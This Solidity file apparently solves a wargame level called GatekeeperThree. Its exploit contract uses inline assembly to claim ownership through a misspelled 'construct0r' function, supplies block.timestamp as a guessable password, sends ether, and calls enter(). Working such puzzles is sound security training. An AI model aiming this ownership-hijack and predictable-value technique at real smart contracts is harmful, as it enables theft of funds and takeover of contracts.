// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

interface GatekeeperThree {
    function construct0r() external;

    function enter() external returns (bool entered);

    function getAllowance(uint _password) external;

    function createTrick() external;
}

contract Gatekeeper3Exploit {
    function exploit(address _gatekeeper) public payable {
        // GatekeeperThree gatekeeper = GatekeeperThree(_gatekeeper);

        // gatekeeper.construct0r();

        // gatekeeper.createTrick();
        // gatekeeper.getAllowance(block.timestamp);

        // (bool success, ) = address(gatekeeper).call{ value: msg.value }("");
        // require(success);

        // gatekeeper.enter();

        assembly {
            function getStrLen(_str) -> _length {
                for {
                    let i := 0
                } lt(i, 0x20) {
                    i := add(i, 1)
                } {
                    if iszero(byte(i, _str)) {
                        break
                    }
                    _length := add(_length, 1)
                }
            }

            function hashSelector(_sig) {
                mstore(0, _sig)
                mstore(0, keccak256(0, getStrLen(_sig)))
            }

            function callExternal(_address, _sig, _param) {
                hashSelector(_sig)
                let calldataLen := 4

                if iszero(iszero(_param)) {
                    mstore(4, _param)
                    calldataLen := 0x24
                }

                let _success := call(gas(), _address, 0, 0, calldataLen, 0, 0)
                if iszero(_success) {
                    revert(0, 0)
                }
            }

            callExternal(_gatekeeper, "construct0r()", 0)
            callExternal(_gatekeeper, "createTrick()", 0)
            callExternal(_gatekeeper, "getAllowance(uint256)", timestamp())
            let success := call(gas(), _gatekeeper, callvalue(), 0, 0, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
            callExternal(_gatekeeper, "enter()", 0)
        }
    }
}
